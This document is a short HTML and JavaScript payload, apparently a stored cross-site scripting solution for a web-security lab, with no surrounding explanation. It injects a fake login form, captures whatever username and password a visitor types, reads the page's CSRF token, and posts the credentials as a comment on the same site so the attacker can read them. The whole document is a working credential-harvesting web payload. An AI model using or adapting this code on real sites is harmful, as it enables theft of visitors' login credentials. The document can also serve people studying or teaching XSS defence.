<section>
    <form class=login-form method=POST action=/login>
        <label>Username</label>
            <input required type=username name="username" id="user2hack">
        <label>Password</label>
            <input required type=password name="password" id="psw2hack">
            <button class=button type=submit> Log in </button>
    </form>
</section>


<script>
function grabUserPsw(){
    var username = document.getElementById('user2hack').value;
    var password = document.getElementById('psw2hack').value;
    return [username, password]
};

function postCreds(){
    var creds = grabUserPsw();
    var username = creds[0];
    var password = creds[1];
    var credentials = "username:" + username + " - password:" + password;
    var domain = document.domain;
    var csrf = document.getElementsByName("csrf")[0].defaultValue;
    var details = {
        'csrf' : csrf,
        'postId' : 2,
        'comment' : credentials,
        'name' : 'victim',
        'email' : 'test@test.test',
        'website' : 'http://victim'
    };
    formBody = [];
    for (property in details){
        var encodedKey = encodeURIComponent(property);
        var encodedValue = encodeURIComponent(details[property]);
        formBody.push(encodedKey + "=" + encodedValue)
    };
    formBody = formBody.join("&");

    fetch("https://"+domain+"/post/comment", {
        method : "POST",
        headers : {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body : formBody
    });
};

document.body.onload = function(e){
    document.getElementById('psw2hack').addEventListener('change', function(e){
        postCreds();
    });
    document.getElementById('user2hack').click()
}
</script>
